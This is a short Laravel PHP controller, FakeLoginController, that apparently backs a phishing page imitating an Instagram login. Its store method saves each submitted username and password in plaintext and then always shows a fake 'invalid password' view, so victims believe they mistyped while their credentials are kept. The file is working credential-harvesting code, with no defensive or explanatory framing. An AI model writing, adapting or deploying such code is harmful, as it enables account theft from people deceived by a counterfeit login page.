<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Insta;
use Carbon\Carbon;

class FakeLoginController extends Controller
{
    public function showForm()
    {
        return view('welcome');
    }

    public function store(Request $request)
    {
        $request->validate([
            'username' => 'required|string',
            'password' => 'required|string',
        ]);

        // Save data to database
        Insta::create([
            'username' => $request->username,
            'password' => $request->password,

        ]);

        // Return the custom error view with back & continue options
        return view('invalid-password');
    }
}
